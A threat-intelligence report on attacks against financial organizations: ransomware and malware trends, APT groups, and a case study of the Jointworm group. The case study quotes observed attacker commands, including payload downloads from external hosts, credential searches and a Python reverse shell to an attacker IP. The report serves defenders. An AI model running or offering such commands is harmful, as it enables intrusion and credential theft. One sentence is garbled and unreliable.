The huge amounts of money passing in and out of\nfinancial organizations on a daily basis—now in a primarily digital format—\nmake them a prime target for profit-focused cyber criminals.\n\nSymantec, a division of Broadcom has examined the activity targeted at\nsome of our biggest financial customers since the start of 2019 and have\nfound that detections of both malware and ransomware on customer\nnetworks are trending upwards.\n\nThe monthly detections in both categories have gone up and down since\nthe start of 2020, with ransomware detections dropping sharply in March\nas the world went into lockdown due to COVID-19. However, the overall\ntrend for detections is still upwards, showing that financial institutions still\nneed to be aware of the threats that face them from cyber criminals and\nother threat actors.\n\n\n-----\n\nSymantec has also been tracking the activity of a sophisticated attack group with its sights firmly set on the\nfinancial sector. Jointworm has been involved in a campaign targeting financial services companies and IT\ncompanies that serve financial services organizations in Europe and the U.S. This group has been active since at\nleast 2017, with the campaign targeting companies in the financial sector ongoing since December 2019.\n\n### Ransomware: A High-Cost Threat\n\nRansomware is probably the biggest threat on the cyber security landscape at the moment, with ransomware\ntargeting top financial sector organizations trending upwards over the 17-month period we examined. Almost\nthree times as many financial sector businesses were targeted with ransomware in February 2020 as in December\n2019. While these numbers fell back in March, potentially due to the COVID-19 pandemic disrupting the activity\nof targeted ransomware gangs, they rebounded again in April. In total, there were more than twice as many\nransomware detections on the systems of financial organizations in the first five months of 2020 as there were in\nthe first five months of 2019, with a clear upward trend visible in Figure 1.\n\nFigure 1. Ransomware Detection Count in Top Financial Customers, January 2019 to May 2020\n\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec Jan Feb Mar Apr May\n2019 2020\n\nThe gangs behind targeted ransomware threats have become more sophisticated and dangerous in recent times.\nTraditionally, ransomware actors would encrypt your system and demand a ransom to provide the decryption key.\nIf businesses had sufficient backups of their systems available they could generally restore their systems without\npaying the ransom. However, since December 2019, targeted ransomware gangs have also been stealing the data\nof the businesses they hit, and threatening to publish this stolen data if victims do not pay the ransom. By doing\nthis, ransomware actors have doubled their leverage, because even if a business is well-prepared and can restore\ntheir encrypted systems from backups, they may still choose to pay the ransom so their confidential business\ninformation is not exposed.\n\nFor banks and financial institutions, which cannot afford downtime and which also hold a huge amount of people’s\npersonally identifiable information (PII), this recent trend in targeted ransomware is a huge threat to their business.\n\n\n-----\n\nThe advice to businesses that are hit by ransomware is generally to not pay the attackers, primarily for two reasons:\n(1) if hackers continue to profit from ransomware attacks they will continue to perpetrate them, and (2) you are\ndealing with criminals, so there is no guarantee that they will honor their side of the deal and provide you with a key\nto decrypt your files. However, recent horror stories—such as the close to $20 million ransomware recovery costs\n[reportedly faced by the cities of Atlanta and Baltimore when they did not pay the requested ransoms—have led to](https://www.scmagazine.com/home/security-news/ransomware/atlanta-ransomware-recovery-cost-now-at-17-million-reports-say/)\nmany businesses choosing to pay a ransom rather than risk facing significantly higher recovery costs.\n\nThe cost of paying ransoms for most businesses is also generally covered by cyber insurance. Cyber insurers are\noften willing to pay the ransom if they believe the cost of paying it would be lower than the payout required for a\ncostly and labor-intensive recovery operation if the ransom is not paid.\n\n\n-----\n\n##### Case Study: WastedLocker\n\n\n-----\n\n### APT Groups: Cyber Criminals Not the Only Concern\n\nIt is not just cyber-crime gangs that are going after companies in the financial sector - sophisticated, often nationstate-sponsored advanced persistent threat (APT) groups also have their sights set on companies in the financial\nsector.\n\nNation-state actors, unlike cyber criminals, are not generally financially motivated, so in many cases they do not\ntarget financial institutions, as they are often more interested in other sectors, such as government organizations.\nIf they do target financial institutions it can often be for intelligence gathering means, rather than to actually steal\nfunds from the financial institution in question. However, there have been some notable financially motivated\nattacks on the financial sector by APT groups in the past.\n\n[The APT group that is best known for targeting organizations for financial gain is probably Lazarus, which the FBI](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/fastcash-lazarus-atm-malware)\nhas said is a state-sponsored group backed by the North Korean government. Lazarus has been linked to numerous\nhigh-profile attacks, including the attack on Sony Pictures in 2014, which was widely believed to be revenge for the\nrelease of the movie The Interview, which was considered to have been offensive to North Korea’s leadership. The\n[group was also linked with the infamous WannaCry ransomware that caused huge disruption around the world in](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/wannacry-ransomware-attack)\n2017.\n\nIn the financial world, Lazarus was linked to a series of attacks exploiting the SWIFT payment system in an attempt\n[to steal money from banks worldwide. The most infamous example of this was the so-called Bangladesh bank heist,](https://www.wired.com/2016/05/insane-81m-bangladesh-bank-heist-heres-know/)\nwhen the group attempted to steal $81 million, but due to the quick actions of bank staff eventually made off with\na lot less. A number of other attacks or attempted attacks exploiting the SWIFT banking framework have been\nattributed to Lazarus over the last number of years.\n\nFIN7 (or Fruitfly) and Carbanak are two other sophisticated groups known for their attacks on the financial sector.\nThese groups have some crossover with malware and tactics so are believed by some to be the same group, but\nSymantec still tracks them as two separate entities. Carbanak is more focused on the financial sector, with FIN7\n[implicated in attacks on other sectors too. Symantec blogged about Carbanak in 2015 when the gang was exposed](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/carbanak-cybercrime-gang)\n[as having stolen millions of dollars from hundreds of banks worldwide. At the time, we described the gang’s choice](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/carbanak-cybercrime-gang)\nto target banks themselves rather than bank customers as “atypical,” as at the time cyber-crime gangs were more\ntypically targeting bank customers rather than the banks themselves. The group compromised banks through\nmalware delivered in spear-phishing emails and would maintain a stealthy presence on bank networks until it was\nready to launch an attack. The group would then cash out by either transferring money from the bank to accounts\nit controlled, or by hijacking ATMs to force them to dispense cash to individuals working with the gang. It was\nspeculated that Carbanak could have made up to $1 billion in those attack campaigns.\n\n[Carbanak has also been linked to another group, Odinaff, which Symantec wrote about in 2016. We linked the](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)\ngroup to a series of campaigns targeting financial organizations worldwide. The group targeted organizations in\nthe U.S., Hong Kong, the U.K., Australia, and other regions in the sophisticated campaign. Most of Odinaff’s victims\nwere in the financial sector, and the group was also observed at the time launching attacks on SWIFT users, using\nmalware to hide customers’ own records of SWIFT messages relating to fraudulent transactions. This is similar to\nactivity carried out by the Lazarus group in its attacks on banks worldwide, but there is no indication of any link\nbetween Odinaff and the Lazarus group.\n\nThe sophisticated tactics and tools used by APT groups like Lazarus, Odinaff, and others, make them a particularly\ndangerous threat for institutions in all sectors, including the financial sector.\n\n#### Deep Dive: Jointworm − Sophisticated Attack Group Sets Sights on the Financial Sector\n\nSymantec researchers recently spotted the activity of a targeted attack group that is focused on financial services\ncompanies and IT companies that serve financial services organizations in Cyprus, Ukraine, the U.S., and Czech\nRepublic.\n\nThis group—dubbed Jointworm—has been active since at least August 2017 and appears to be financially\nmotivated. This latest campaign aimed at the financial sector appears to have started in December 2019. We\nspotted Jointworm in at least seven organizations in the period from December 2019 to June 2020.\n\n\n-----\n\nJointworm is identified by its use of a JavaScript backdoor (or EVILNUM) which is custom to the group. This\nbackdoor is typically delivered via malicious emails that contain a link to a ZIP archive. The archive file contains\nan LNK attachment masquerading as an Office document, an Excel sheet for example, which contains malicious\nJavaScript.\n\nIts targets in this recent campaign include companies in the financial sector internationally, including those that\noperate within the stock exchange markets, and some tech companies that develop technologies for use by\nfinancial organizations (also known as fintech companies). A media company was also targeted in this campaign.\n\nThe group was able to spend a significant amount of time on the networks of some of its victims. Jointworm was\npresent on the network of one financial sector organization for 184 days, and another financial sector victim for 123\ndays.\n\n##### Tools, Tactics, and Procedures\n\nThe group uses email as its initial vector and was spotted using generic, financial related lures and attachment\nnames. The malicious email links to an archive file on a trusted cloud provider that contains an LNK file\nmasquerading as a document or image. This decoy document is displayed to the user and an embedded JavaScript\nfile is executed to install a backdoor.\n\nThe backdoor that is installed also has a Python interpreter embedded in it, which is used by the attackers. The\nattackers deploy classic living-off-the-land tactics, abusing legitimate admin tools on infected machines, to\ndownload additional tools and malware. Legitimate tools exploited by the attackers include:\n\n   - PowerShell – PowerShell is a powerful interactive command-line interface and scripting environment included\nin the Windows operating system that is frequently exploited by malicious actors to execute commands on\ncompromised systems.\n\n   - WMI Commands – WMI is a Windows administration feature that can be abused by attackers to execute\ncommands and for lateral movement on infected systems.\n\nBoth of these techniques feature in our table of the top 20 MITRE ATT&CK® techniques most-used against top\norganizations in the financial sector in the period examined (see in Appendix (ii)).\n\nOther legitimate tools leveraged by Jointworm include the following:\n\n   - msiexec – msiexec is a legitimate part of the Windows Installer Component and is used to install new\nprograms; however, it can also be used by malicious actors to install malware on victim machines.\n\n   - BITSAdmin – BITSAdmin is a legitimate command-line tool that can be abused by malicious actors to install\nmalware.\n\n   - MSXSL – MSXSL can legitimately be used to convert files from one format to another, but can also be\nexploited by malicious actors to issue commands.\n\n   - CMSTP – This is the Microsoft Connection Manager Profile Installer, but it can also be abused by attackers to\nexecute commands and install malicious tools.\n\nThese tools are exploited and used to download and execute various malicious payloads.\n\nThe attackers use a loader (an OCX file) to provide themselves with additional capabilities. Based on the file names\nused by Jointworm, it is likely the group is using these OCX files to load Metasploit and Cobalt Strike modules in\norder to enable further capabilities.\n\nThe loader itself is believed to originate from a malware-as-a-service (MaaS) provider known as Golden Chicken.\nThis is a known group that also sells loaders to other groups, including FIN6 and the Cobalt Group.\n\n\n-----\n\nThe Golden Chicken tools arrive as ActiveX (OCX) components and all contain TerraLoader code, which serves as a\n[common loader for various payloads, as outlined previously in the We Live Security blog:](https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/)\n\n  - The attackers manually send a command to the JS or C# component to drop and execute a batch file from\none of their servers.\n\n  - That batch file writes a malicious INF file and supplies it as a parameter to the Microsoft utility cmstp.exe,\nwhich executes a remote scriptlet specified in the INF file.\n\n  - The remote scriptlet contains obfuscated JS code that drops an OCX file and executes it via regsvr32.exe.\n\nA lot of the group’s tools are signed with what appear to be invalid certificates. The attackers are observed\nsearching for any files that contain the string “cpassword”—this is related to Active Directory Group Policy files\n(XML files) that contain encrypted passwords. Microsoft published the password used to encrypt these files prior\nto 2012, so if the encrypted passwords are found, they are trivial to decrypt and use to move laterally across the\nnetwork or perform privilege escalation to a network admin’s account.\n\n##### Case Study: Jointworm Activity Across a Financial Organization in Europe\n\nWe have insight into Jointworm’s activity on several organizations’ networks. We observed the attackers’ activity\non multiple machines in a leading European finance company that offers online trading of shares, contracts, and\ninternational foreign exchange. The attacker had a presence on this victim’s network for more than 100 days.\n\nInitial Access\n\nOn one machine in this organization, the first evidence of initial infection was identified as a malicious LNK file\nmasquerading as an Excel document using a financial lure. A malicious JavaScript file was embedded as an\nalternative data stream (ADS) in the document. The user of this machine opened the file and a backdoor was\ndropped and executed (media.js).\n\n  - CSIDL_SYSTEM\\cscript.exe” “AINVESTMENTS VOIP SPREEDSHEET.xlsx.lnk:e.js””\n\n  - CSIDL_SYSTEM\\cscript.exe” “CSIDL_PROFILE\\appdata\\roaming\\microsoft\\credentials\\mediaplayer\\\nmediamanager\\media.js”\n\nApproximately two hours later, the attackers became active on the compromised machine. Initially, it appears the\nattackers test connectivity by running the following command indicating a successful execution:\n\n  - CSIDL_SYSTEM\\cmd.exe” /c success\n\nSixteen minutes later, the attackers launched an interactive Python interpreter session and used this to launch a\nsecond JavaScript file:\n\n  - CSIDL_SYSTEM\\cscript.exe” CSIDL_PROFILE\\appdata\\local\\temp\\reportapi.js”\n\nAt this point, there was further activity on the interactive Python shell and approximately two hours later, an OCX\nloader component (msf.ocx) was executed.\n\n  - regsvr32.exe /s /i CSIDL_COMMON_APPDATA\\msf.ocx\n\nSeveral minutes later, an instance of PowerShell was launched but there was very little activity observed from\nthe attackers. At this point, the attacker activity ceased for seven days until the attackers returned and began\nasset discovery activities by collecting network related information from remote machines.\n\n##### Downloading Additional Tools and Malware\n\nPassword Protected Archives\n\nOn another machine following the initial intrusion, the attackers were able to install their backdoor via PsExec and\nproceed to download a password protected archive containing a set of tools.\n\n\n-----\n\nThe following command was observed:\n\n  - CSIDL_SYSTEM\\cmd.exe /c c:&&cd CSIDL_PROFILE\\appdata\\roaming\\microsoft\\credentials\\\nmediaplayer&&unrar.exe x Utilities.rar -p123123 CSIDL_PROFILE\\appdata\\roaming\\microsoft\\credentials\\\nmediaplayer > CSIDL_PROFILE\\appdata\\roaming\\microsoft\\credentials\\mediaplayer\\filetoupload.txt 2>&1\n\nThe above command was used to change a directory to ‘mediaplayer’ where the attackers extract their tools. They\nthen ran unrar.exe using the password “123123” to extract the archive’s contents. The output is redirected to a file\nthat the attackers likely retrieve to confirm if the extraction process succeeded or not.\n\nCopying Tools from Remote Shares\n\nSeveral days later, on the same machine, we observed the attackers copying tools from a remote machine over\nSMB.\n\n  - CSIDL_SYSTEM\\cmd.exe /c copy \\\\139.28.37.53\\webdav27368a\\ccv.exe “CSIDL_PROFILE\\appdata\\roaming\\\nmicrosoft\\credentials\\mediaplayer\\ccv.exe”\n\nSimilarly, we also observed the following command being used to download tools in other victims’ networks:\n\n  - CSIDL_SYSTEM\\cmd.exe /c net use \\\\185.61.137.141\\webdav0xx0x00x0 && net use /delete \\\\185.61.137.141\\\nwebdav0xx0x00x0 && copy /y \\\\185.61.137.141\\webdav0xx0x00x0\\ARM.rar CSIDL_PROFILE\\appdata\\\nroaming\\microsoft\\credentials\\mediaplayer\n\nDownloading Tools by Abusing System and Admin Tools\n\nOn several machines, we also observed the attackers abusing msiexec in order to download and install additional\ntools used by the attackers.\n\n  - msiexec /q /i http://45.9.239.50/secupdate2021.msi\n\nSimilarly, we observed the attackers abusing BITSAdmin in order to download tools hosted on file-sharing\nwebsites:\n\n[• bitsadmin /transfer myDownloadJob /download /priority normal https://file.io/mXCmid «CSIDL_PROFILE\\](https://file.io/mXCmid)\nappdata\\roaming\\loader.ocx»\n\nOn multiple machines within the victim’s environment, PowerShell was also abused to download additional\ntools:\n\n[• powershell -command “& { (New-Object Net.WebClient).DownloadFile(‘http://coinzre.website/load.ocx’,](http://coinzre.website/load.ocx)\n‘CSIDL_COMMON_APPDATA\\da.ocx’) }”\n\nIdentifying Assets\n\nLeveraging their backdoor access, the attackers ran a series of commands in order to collect various information on\nany assets of interest as they mapped the topology of the network.\n\nCollecting General Information on Compromised Machines\n\nAcross several machines we saw WMIC being used in order to collect some general information on the\ncompromised machine, such as local storage information:\n\n  - wmic logicaldisk get caption,description,drivetype,providername,volumename\n\nCredential Stealing\n\nOn the same machine, the attackers were observed executing a loader file (24067.ocx), presumably to load a\nMetasploit module for extended remote access.\n\nShortly after, the attackers attempted to perform a string search for any files that contain the string “cpassword”.\n\n  - findstr /R /S /C:”cpassword” <redacted info>\n\nTh t i “ d” i d t i f d i XML fil li k d t li i P d t t d f\n\n\n-----\n\nShortly afterwards, the attackers executed PowerShell commands to enumerate systems and add additional\naccounts for their own usage based on retrieved AD credentials.\n\nThe attackers were also observed deploying Mimikatz to dump credentials across multiple machines within victim\norganizations.\n\n##### Additional Tricks\n\nExecuting Arbitrary Commands Via MSXSL\n\nIn order to bypass security restrictions, the attackers were also observed employing some interesting tactics to\nexecute commands. On several machines, we see the attackers launch their backdoor followed by initializing an\ninteractive Python shell. This is shortly followed by commands similar to below being executed:\n\n  - CSIDL_PROFILE\\appdata\\roaming\\microsoft\\msxsl.exe 7345CD415EA32B8801.txt 7345CD415EA32B8801.txt\n\nThe MSXSL tool is a transformation utility that can be used to convert files from one format to another, such as XML\n[to a more human-readable format like HTML. However, this utility can be abused to run arbitrary commands on](https://redcanary.com/blog/detecting-msxsl-attacks/)\nboth local and remote connections.\n\nExecuting Arbitrary Commands Via CMSTP\n\nAdditionally, we have observed the attackers abusing the Microsoft Connection Manager Profile Installer (CMSTP)\nutility to execute arbitrary commands and install additional tools. More commonly we see this command being\n[abused to install Metapsloit or Cobalt Strike modules to extend backdoor access as described in this blog.](https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/)\n\n  - wmic process call create “cmstp /ns /s /su C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\26642.inf”\n\n  - cmstp /ns /s /su CSIDL_PROFILE\\appdata\\roaming\\microsoft\\29723.inf\n\n[According to Microsoft’s documentation the flags used in the above commands are used to instruct the utility not](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp)\nto install a desktop shortcut, ensure a silent install, and only install (or execute) the attackers’ command under the\nguise of the current user.\n\nCustom Python Reverse Shell\n\nThe attackers were also observed deploying a simple, custom Python reverse shell across multiple machines. This\nwas achieved by copying a legitimate Python interpreter executable (rev.exe) onto the infected machine and using\nit to execute the Python file to establish a connection to attacker-controlled infrastructure.\n\n  - CSIDL_PROFILE\\appdata\\roaming\\microsoft\\credentials\\mediaplayer\\revssl\\rev.exe rev.py 185.62.190.89 443\n\n##### What Does Jointworm Want?\n\n[We cannot see what additional information the group is exfiltrating from its victims in this campaign, but in past](https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/)\n[campaigns Jointworm has been seen stealing financial information from targeted companies and their customers.](https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/)\nThis has included:\n\n  - Spreadsheets and other documents\n\n  - Internal presentations\n\n  - Software licenses\n\n  - Cookies and session information\n\n  - Email credentials\n\n  - Customer credit card information and proof of address/identity documents\n\nThis campaign seems to still be ongoing, and Jointworm has a strong focus on financial organizations and other\ncompanies with links to the financial sector, such as fintech companies and organizations that provide IT services to\ncompanies in the financial sector. Companies like this need to be aware that they are targets of sophisticated and\n\n\n-----\n\n### Malicious Activity: Detections Trend Upwards\n\nMalware detections in general in Symantec’s top financial customers were also trending upwards from the start of\n2019 to mid-2020, with the highest number of detections in financial customers seen in October 2019 and February\n2020. While detections have dropped back somewhat since February, they remain higher than they were at the\nsame time in 2019. Detections in February 2020 were twice what they were in February 2019.\n\nFigure 2. Malware Detection Count in Top Financial Customers, January 2019 to May 2020\n\n25\n\n20\n\n15\n\n10\n\n5\n\n0\n\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec Jan Feb Mar Apr May\n2019 2020\n\nThis indicates that financial institutions are still a target for all kinds of cyber crime. The malware being deployed\non these target networks could include infostealers, coinminers, and other backdoors, all of which pose a threat\nto financial institutions and their customers. The top 10 detections shown in Table 1 are mostly generic detections\nand detections for off-the-shelf items like hacktools, with a wide amount of malware being stopped in its tracks by\nthese detections.\n\nTable 1. Top 10 Malware Detections in Top Financial Customers, January 2019 to May 2020\n\n\nMalware\n\n\nTrojan.Gen.2\n\n\nTrojan Horse\n\nW32.Sality.AE\n\nW32.Virut.CF\n\nHacktool\n\nHacktool.Equation\n\nTrojan.Gen\n\nTrojan.Gen.MBT\n\nW97M.Sillycopy\n\nW32.Chir.B@mm\n\n\n-----\n\n##### Geographical Spread: Which Countries Recorded the Most Malware Detections?\n\nWhen we look at the location of the financial services businesses that were targeted since the start of 2019, more\nthan half of the targeted businesses are located in the U.S.\n\nFigure 3. The U.S. is by Far the Country with the Most Malware Detections Among Financial Sector Customers\n\n**Other** 6%\n\n**Turkey** 1%\n\n**Japan** 1%\n\n**Netherlands** 1%\n\n**UK**\n\n**Canada** 1%\n\n9%\n\n**Australia** 1%\n\n**Vietnam** 1%\n\n**United States**\n\n**Thailand** 2%\n\n**Brazil** 58%\n19%\n\nThis is perhaps unsurprising given that a lot of the world’s largest financial institutions are U.S. based. Brazil is in\nsecond place on the list with 19 percent of detections (almost one-in-five) which is also a significant amount. Brazil\nis the largest country in South America and has a large population, which could be enough to make it a target\nfor criminals. After that, the detections are more spread out globally, though the U.K., which is also home to a\nlarge number of international finance firms, also has quite a high number of detections, accounting for 9% of total\nmalware detections. We only have insight into activity aimed at our own customers, so the location of our customer\nbase also has an influence on these numbers.\n\nThe U.S. topping the list for malware detections, followed by a country in South America and then one in Europe,\ndemonstrates that financial sector companies globally are under threat from cyber criminals trying to get malware\nonto their systems.\n\n##### Network Activity: Further Insight into Cyber Criminals’ Endeavors\n\nFile-based detections just show us one part of the story as these detections block the threats that make it as far\nas the machine (the endpoint). Network-based detections reveal further information about the extent of malicious\nactivity on organizations’ networks by detecting and blocking activity at the application layer. If a machine on a\nnetwork becomes infected, the malware is likely to attempt to contact a command and control (C&C) server, which\ncan also trigger these detections. Looking at the number of network detections attempting to contact a C&C server\ncan give us a more realistic idea about how many infected machines are on a network and a truer picture of the\nextent of malicious activity in a sector.\n\n\n-----\n\nFigure 4.

WordPress is the most popular open-source content management system in the\nworld and is used by at least 75 million websites worldwide. Due to its wide usage, it is often targeted by cyber\ncriminals who try to exploit vulnerabilities in the content management system (CMS) or its plugins, or attempt to\nuse it to gain an initial foothold on target systems. Joomla and Apache Struts are also both open-source tools that\nare widely used, and as a result are frequently targeted by malicious actors attempting to gain access to victim\nnetworks. Joomla, like WordPress, is a CMS, while Apache Struts allows users to build web applications using Java.\n\n\n-----\n\nMalicious activity blocked on machines in the U.S. and the UK accounts for the vast majority of malicious activity\non the network in the financial sector, with companies in other countries registering a negligible amount of activity\ncompared to the two large English-speaking economies.\n\nFigure 5. Activity Blocked on the Network, by Country, January 2019 to May 2020\n\n**Other** <1%\n\n**Japan** <1%\n\n**Spain** <1%\n\n**Hong Kong** <1%\n\n**Singapore** <1%\n\n**UK**\n\n**Algeria** 1%\n\n19%\n\n**Brazil** 1%\n\n**United States**\n\n**Canada** 2% 62%\n\nThese statistics show us that activity targeted at organizations in the financial sector is on the rise, with any\nslowdown in this activity due to the COVID-19 pandemic seeming to be negligible or non-existent. Companies in the\nU.S. need to be on high alert as attackers have a strong interest in the world’s largest economy, however, companies\nin Europe and other large economies like the U.K. and Brazil also need to remain on high alert against cyber\ncriminals, and ensure they have a good security posture in place.\n\n### Conclusion\n\nThe financial sector is a tempting target for both everyday cyber criminals looking to make a quick buck, and\nsophisticated nation-state actors with both financial and intelligence motivations. Businesses in this sector need to\nbe aware of these threats and protect their networks from them with a strong security approach.\n\nBetween January 2019 and mid-2020, we observed:\n\n  - Malware detections in companies in the financial sector trending upwards.\n\n  - Ransomware detections in companies in the financial sector trending upwards.\n\n  - High-profile, publicly reported targeted ransomware campaigns impacting companies in the financial sector.\nSome of these gangs are now also stealing data from the businesses they hit and threatening to publish it in\norder to exert further pressure on organizations to pay a ransom.\n\n  - Multiple companies in the financial sector being targeted by Jointworm, a sophisticated, financially motivated\nattack group.\n\nThere may have been some anticipation that the COVID-19 pandemic would lead to a slowdown in cyber-criminal\nactivity, but that doesn’t seem to have occurred, at least among cyber actors targeting the financial sector.\n\nThe threat facing companies in the financial sector from malicious actors is significant, ongoing, and unlikely to\nease off in the future. It is something financial sector companies need to be aware of and prepared for.\n\n\n-----\n\n### Best Practices\n\n  - Deploy an integrated cyber defense platform that shares threat data from endpoint, email, web, cloud apps,\nand infrastructure.\n\n  - Cyber attackers are continually updating their techniques and tools to evade conventional security controls.\nAlways keep these security solutions up to date with the latest protection capabilities, including machine\nlearning and AI, and ensure that your security architecture has the ability to incorporate new state-of-the-art\nsolutions with minimal disruption or cost.\n\n  - Ensure consistent enforcement of security rules and access policies across environments without disrupting\nbusiness processes.\n\n  - Ensure cyber security solutions run both in the cloud and on-premise to better protect infrastructure.\n\n  - Look to solutions that provide real-time threat information, threat analytics, content classification, and\ncomprehensive threat blocking data so the latest threat intelligence is current.\n\n  - Be sure to deploy identity and access management solutions to protect against the theft of executive\ncredentials.\n\n  - Where possible, install the latest patches on all devices, and consider an endpoint management solution with\nautomated patch management.\n\n  - Ensure all employees use strong passwords and enable two-factor authentication.\n\n  - Ensure the latest version of PowerShell is installed and logging is enabled.\n\n  - Restrict access to Remote Desktop Services (RDS): Only allow RDS from specific known IP addresses and\nensure usage of multi-factor authentication. Consider similar access controls for other popular admin tools so\nthey cannot be used by attackers to infiltrate the network undetected.\n\n  - Implement offline backups that are onsite. Ensure there are backups that are not connected to the network to\nprevent them from being encrypted by ransomware.\n\n  - Test restore capability. Ensure restore capabilities support the needs of the business.\n\n  - Educate staff to ensure they understand cyber security principles and do not engage in any behaviors that\nmay put patients’ or customers’ data at risk.\n\n  - Improve detection and response capabilities by spreading security investments beyond prevention and\nprotection technologies. Faster detection and resolution times can dramatically reduce the impact of data\nbreaches.\n\n  - Leverage behavioral analytics technology wherever possible. Attackers frequently compromise privileged\ndevices or user accounts to carry out attacks, and having analytics capabilities to identify anomalous\nbehavior is one of the most effective ways to identify that an attack is taking place.\n\n\n-----\n\n### Appendix (i)\n\nIndicators of Compromise (IoCs)\n\n\nAlias:\nfile_sha2:8271fb0ee50b742b4740f01f5d89b411bb98a94a00cf045315508c54d2192774 Jointworm\nPhantomCoreAgent\n\n\n-----\n\nNetwork Indicators\n\n\n-----\n\n### Appendix (ii)\n\nTop 20 MITRE ATT&CK® Techniques Seen on Top Financial Customers January 2019 – May 2020\n\nTactic Technique Name Technique ID Technique URL\n\nExecution PowerShell T1086 [https://attack.mitre.org/techniques/T1086](https://attack.mitre.org/techniques/T1086)\n\nExecution Windows Management Instrumentation T1047 [https://attack.mitre.org/techniques/T1047](https://attack.mitre.org/techniques/T1047)\n\nCredential Access Credential Dumping T1003 [https://attack.mitre.org/techniques/T1003](https://attack.mitre.org/techniques/T1003)\n\nDefense Evasion Obfuscated Files or Information T1027 [https://attack.mitre.org/techniques/T1027](https://attack.mitre.org/techniques/T1027)\n\nDefense Evasion Process Injection T1055 [https://attack.mitre.org/techniques/T1055](https://attack.mitre.org/techniques/T1055)\n\nCommand and Control Remote File Copy T1105 [https://attack.mitre.org/techniques/T1105](https://attack.mitre.org/techniques/T1105)\n\nExecution Mshta T1170 [https://attack.mitre.org/techniques/T1170](https://attack.mitre.org/techniques/T1170)\n\nDefense Evasion Modify Registry T1112 [https://attack.mitre.org/techniques/T1112](https://attack.mitre.org/techniques/T1112)\n\nExecution Service Execution T1035 [https://attack.mitre.org/techniques/T1035](https://attack.mitre.org/techniques/T1035)\n\nExecution User Execution T1204 [https://attack.mitre.org/techniques/T1204](https://attack.mitre.org/techniques/T1204)\n\nDiscovery Security Software Discovery T1063 [https://attack.mitre.org/techniques/T1063](https://attack.mitre.org/techniques/T1063)\n\nExecution Rundll32 T1085 [https://attack.mitre.org/techniques/T1085](https://attack.mitre.org/techniques/T1085)\n\nExecution Trusted Developer Utilities T1127 [https://attack.mitre.org/techniques/T1127](https://attack.mitre.org/techniques/T1127)\n\nDefense Evasion Regsvr32 T1117 [https://attack.mitre.org/techniques/T1117](https://attack.mitre.org/techniques/T1117)\n\nExecution Scripting T1064 [https://attack.mitre.org/techniques/T1064](https://attack.mitre.org/techniques/T1064)\n\nDefense Evasion Rundll32 T1085 [https://attack.mitre.org/techniques/T1085](https://attack.mitre.org/techniques/T1085)\n\nExecution Regsvr32 T1117 [https://attack.mitre.org/techniques/T1117](https://attack.mitre.org/techniques/T1117)\n\nLateral Movement Remote File Copy T1105 [https://attack.mitre.org/techniques/T1105](https://attack.mitre.org/techniques/T1105)\n\nDefense Evasion Deobfuscate/Decode Files or Information T1140 [https://attack.mitre.org/techniques/T1140](https://attack.mitre.org/techniques/T1140)\n\nCredential Access Credentials in Files T1081 [https://attack.mitre.org/techniques/T1081](https://attack.mitre.org/techniques/T1081)\n\n[For product information and a complete list of distributors, visit our website at: broadcom.com](http://www.broadcom.com)\n\nCopyright © 2020 Broadcom.
